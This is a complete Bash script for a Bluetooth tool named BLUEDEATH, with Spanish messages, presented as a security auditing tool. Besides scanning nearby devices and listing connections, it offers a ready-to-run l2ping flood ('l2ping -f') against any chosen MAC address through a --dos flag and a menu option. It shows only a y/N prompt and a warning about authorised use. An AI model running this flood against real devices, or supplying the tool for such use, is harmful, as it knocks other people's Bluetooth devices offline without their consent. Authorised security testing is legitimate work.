#!/usr/bin/env bash
#
# BLUEDEATH - Bluetooth security auditing tool for BR/EDR devices.
# Author: theoffsecgirl
#
# Features:
#   - Scan nearby Bluetooth devices (BR/EDR)
#   - List current connections
#   - Inquiry scan (discoverable/connectable)
#   - Check active devices via l2ping
#   - Controlled l2ping flood (DoS-style stress test)
#   - Logging of actions and results
#
# Usage examples:
#   sudo ./bluedeath.sh --menu
#   sudo ./bluedeath.sh --scan
#   sudo ./bluedeath.sh --active
#   sudo ./bluedeath.sh --dos AA:BB:CC:DD:EE:FF
#   sudo BT_INTERFACE=hci1 ./bluedeath.sh --scan
#

set -o errexit
set -o nounset
set -o pipefail

# ---------- Global config ---------- #

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="${SCRIPT_DIR}/logs"
LAST_SCAN_FILE="${LOG_DIR}/last_scan.txt"
LOG_FILE="${LOG_DIR}/bluedeath_$(date +%F_%H-%M-%S).log"

BT_INTERFACE="${BT_INTERFACE:-hci0}"

# Colors (simple, not overdone)
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# ---------- Helpers ---------- #

log() {
    local msg="$1"
    mkdir -p "${LOG_DIR}"
    printf "[%s] %s\n" "$(date +'%F %T')" "${msg}" | tee -a "${LOG_FILE}"
}

info()  { printf "${BLUE}[i]${RESET} %s\n" "$1"; }
ok()    { printf "${GREEN}[+]${RESET} %s\n" "$1"; }
warn()  { printf "${YELLOW}[!]${RESET} %s\n" "$1"; }
error() { printf "${RED}[-] %s${RESET}\n" "$1" >&2; }

require_root() {
    if [[ "${EUID}" -ne 0 ]]; then
        error "BLUEDEATH requiere privilegios de superusuario. Ejecuta con sudo."
        exit 1
    fi
}

check_dependencies() {
    local deps=("hcitool" "hciconfig" "l2ping")
    local missing=()

    for dep in "${deps[@]}"; do
        if ! command -v "${dep}" &>/dev/null; then
            missing+=("${dep}")
        fi
    done

    if (( ${#missing[@]} > 0 )); then
        error "Faltan dependencias: ${missing[*]}"
        printf "Instala el paquete 'bluez' en tu distribución y vuelve a intentarlo.\n"
        exit 1
    fi
}

check_interface() {
    if ! hciconfig "${BT_INTERFACE}" &>/dev/null; then
        error "La interfaz Bluetooth '${BT_INTERFACE}' no existe o no está activa."
        printf "Comprueba 'hciconfig' o ajusta BT_INTERFACE (ej: BT_INTERFACE=hci1).\n"
        exit 1
    fi
}

banner() {
    cat <<EOF
==================================================
  BLUEDEATH  -  Bluetooth security auditing tool
  Interface: ${BT_INTERFACE}
==================================================
EOF
}

usage() {
    cat <<EOF
Usage: sudo ./bluedeath.sh [options]

Options:
  --scan            Escanea dispositivos Bluetooth cercanos (BR/EDR)
  --connected       Muestra conexiones Bluetooth actuales
  --inquiry         Realiza inquiry scan (dispositivos conectables)
  --active          Comprueba dispositivos activos (respuesta a l2ping)
  --dos MAC         Ejecuta l2ping flood controlado contra MAC
  --interface IF    Usa la interfaz Bluetooth IF (por defecto: hci0)
  --menu            Inicia el menú interactivo
  -h, --help        Muestra esta ayuda

También puedes usar la variable de entorno:
  BT_INTERFACE=hci1 sudo ./bluedeath.sh --scan
EOF
}

# ---------- Core actions ---------- #

scan_devices() {
    banner
    info "Iniciando escaneo Bluetooth con interfaz ${BT_INTERFACE}…"
    mkdir -p "${LOG_DIR}"

    # hcitool scan devuelve: "XX:XX:XX:XX:XX:XX  NOMBRE"
    if ! hcitool -i "${BT_INTERFACE}" scan > "${LAST_SCAN_FILE}" 2>>"${LOG_FILE}"; then
        error "Error durante el escaneo."
        exit 1
    fi

    ok "Escaneo completado. Resultados:"
    cat "${LAST_SCAN_FILE}" | sed '1d' || true   # saltar encabezado "Scanning ..."
    log "Scan completado. Resultados guardados en ${LAST_SCAN_FILE}"
}

list_connected() {
    banner
    info "Mostrando conexiones Bluetooth actuales…"
    if ! hcitool con | tee -a "${LOG_FILE}"; then
        error "No se pudieron obtener las conexiones."
        exit 1
    fi
}

inquiry_scan() {
    banner
    info "Realizando inquiry scan con interfaz ${BT_INTERFACE}…"

    if ! hcitool -i "${BT_INTERFACE}" inq | tee -a "${LOG_FILE}"; then
        error "Error en inquiry scan."
        exit 1
    fi
}

select_device_from_last_scan() {
    if [[ ! -f "${LAST_SCAN_FILE}" ]]; then
        error "No hay resultados de escaneo previos. Ejecuta primero --scan o desde el menú."
        return 1
    fi

    mapfile -t lines < <(sed '1d' "${LAST_SCAN_FILE}" || true)
    if (( ${#lines[@]} == 0 )); then
        error "El escaneo anterior no encontró dispositivos."
        return 1
    fi

    printf "\nDispositivos detectados:\n"
    local i=1
    declare -a macs
    for line in "${lines[@]}"; do
        local mac name
        mac=$(awk '{print $1}' <<< "${line}")
        name=$(cut -d' ' -f2- <<< "${line}")
        printf "  [%d] %s  (%s)\n" "${i}" "${mac}" "${name}"
        macs+=("${mac}")
        ((i++))
    done

    printf "\nSelecciona un dispositivo por número: "
    read -r choice

    if ! [[ "${choice}" =~ ^[0-9]+$ ]] || (( choice < 1 || choice > ${#macs[@]} )); then
        error "Selección no válida."
        return 1
    fi

    SELECTED_MAC="${macs[choice-1]}"
    ok "Seleccionado: ${SELECTED_MAC}"
    return 0
}

check_active_devices() {
    banner
    info "Comprobando dispositivos activos mediante l2ping…"

    if ! select_device_from_last_scan; then
        return 1
    fi

    info "Enviando 3 paquetes l2ping a ${SELECTED_MAC}…"
    if l2ping -i "${BT_INTERFACE}" -c 3 "${SELECTED_MAC}" | tee -a "${LOG_FILE}"; then
        ok "Dispositivo activo."
    else
        warn "El dispositivo no respondió a l2ping."
    fi
}

dos_attack() {
    local mac="$1"

    banner
    warn "Vas a iniciar un l2ping flood contra: ${mac}"
    printf "Usa esto SOLO en entornos controlados y con autorización explícita.\n"
    printf "¿Deseas continuar? [y/N]: "
    read -r confirm

    if [[ "${confirm}" != "y" && "${confirm}" != "Y" ]]; then
        info "Operación cancelada por el usuario."
        return
    fi

    info "Iniciando l2ping flood (CTRL+C para detener)…"
    log "Iniciando ataque l2ping -f contra ${mac} desde ${BT_INTERFACE}"

    # No usamos set -e aquí porque el usuario puede cortar con CTRL+C
    set +e
    l2ping -i "${BT_INTERFACE}" -f "${mac}" 2>&1 | tee -a "${LOG_FILE}"
    set -e

    ok "l2ping flood detenido."
}

# ---------- Menu ---------- #

show_menu() {
    while true; do
        banner
        cat <<EOF
[1] Escanear dispositivos Bluetooth
[2] Ver conexiones actuales
[3] Inquiry scan (dispositivos conectables)
[4] Comprobar dispositivo activo (l2ping)
[5] Ejecutar l2ping flood (DoS controlado)
[6] Mostrar interfaz actual
[7] Salir
EOF
        printf "\nOpción: "
        read -r opt

        case "${opt}" in
            1) scan_devices; read -rp $'\nPulsa ENTER para continuar… ' _ ;;
            2) list_connected; read -rp $'\nPulsa ENTER para continuar… ' _ ;;
            3) inquiry_scan; read -rp $'\nPulsa ENTER para continuar… ' _ ;;
            4) check_active_devices; read -rp $'\nPulsa ENTER para continuar… ' _ ;;
            5)
                if [[ -z "${LAST_SCAN_FILE}" || ! -f "${LAST_SCAN_FILE}" ]]; then
                    warn "No hay escaneo previo. Ejecuta la opción 1 primero."
                    read -rp $'\nPulsa ENTER para continuar… ' _
                    continue
                fi
                if select_device_from_last_scan; then
                    dos_attack "${SELECTED_MAC}"
                fi
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            6)
                printf "\nInterfaz actual: %s\n" "${BT_INTERFACE}"
                hciconfig "${BT_INTERFACE}" || true
                read -rp $'\nPulsa ENTER para continuar… ' _
                ;;
            7) info "Saliendo de BLUEDEATH."; exit 0 ;;
            *) warn "Opción no válida." ;;
        esac
    done
}

# ---------- Argument parsing ---------- #

parse_args() {
    if (( $# == 0 )); then
        # Sin argumentos -> menú por defecto
        show_menu
        exit 0
    fi

    local mac_for_dos=""

    while (( $# > 0 )); do
        case "$1" in
            --scan)
                ACTION="scan"
                shift
                ;;
            --connected)
                ACTION="connected"
                shift
                ;;
            --inquiry)
                ACTION="inquiry"
                shift
                ;;
            --active)
                ACTION="active"
                shift
                ;;
            --dos)
                ACTION="dos"
                mac_for_dos="${2:-}"
                if [[ -z "${mac_for_dos}" ]]; then
                    error "Uso: --dos MAC_ADDRESS"
                    exit 1
                fi
                DOS_MAC="${mac_for_dos}"
                shift 2
                ;;
            --interface)
                BT_INTERFACE="${2:-}"
                if [[ -z "${BT_INTERFACE}" ]]; then
                    error "Uso: --interface hciX"
                    exit 1
                fi
                shift 2
                ;;
            --menu)
                ACTION="menu"
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                error "Opción desconocida: $1"
                usage
                exit 1
                ;;
        esac
    done
}

# ---------- Main ---------- #

main() {
    require_root
    check_dependencies
    check_interface

    parse_args "$@"

    case "${ACTION:-menu}" in
        scan)       scan_devices ;;
        connected)  list_connected ;;
        inquiry)    inquiry_scan ;;
        active)     check_active_devices ;;
        dos)        dos_attack "${DOS_MAC}" ;;
        menu)       show_menu ;;
        *)          usage ;;
    esac
}

main "$@"
